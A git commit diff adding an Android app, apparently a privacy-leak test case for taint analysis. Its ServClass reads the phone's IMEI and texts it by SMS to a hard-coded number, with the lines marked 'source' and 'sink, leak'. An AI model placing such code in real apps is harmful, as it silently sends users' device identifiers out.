e0d695e4cf3a0bfcb0285f3d729e8ba143d570a8
shivapbhusal <civabhusal@gmail.com>
2018-01-30 13:23:04 -0500

    refactor IMEILeak_v3

---
+++ Imeileak-V2/app/src/main/java/com/imeileakv2/MainActivity.java
@@ -0,0 +1,25 @@
+package com.imeileakv2;
+
+import android.app.Activity;
+import android.content.Intent;
+import android.os.Bundle;
+import android.view.View;
+
+/**
+ * Created by dewan on 1/27/18.
+ */
+
+public class MainActivity  extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+    }
+    public void nextActivity(View view)
+    {
+        Intent intent = new Intent(MainActivity.this,HiddenActivity.class);
+        startActivity(intent);
+    }
+}
+
---
+++ Imeileak-V2/app/src/main/java/com/imeileakv2/ServClass.java
@@ -0,0 +1,48 @@
+package com.imeileakv2;
+
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Binder;
+import android.os.IBinder;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+import android.widget.Toast;
+
+
+/**
+ * Created by dewan on 1/27/18.
+ */
+
+public class ServClass extends Service {
+
+
+    IBinder mBinder = new LocalBinder();
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return mBinder;
+    }
+
+    public class LocalBinder extends Binder {
+        public ServClass getServerInstance() {
+            return ServClass.this;
+        }
+    }
+    public String getImei()
+    {
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+        String imei = telephonyManager.getDeviceId(); //source
+        return imei;
+    }
+    public void leakImei(String imei)
+    {
+        Toast.makeText(this, imei, Toast.LENGTH_LONG).show();
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("4193784172", null, imei, null, null);  //sink, leak
+
+
+    }
+
+
+}
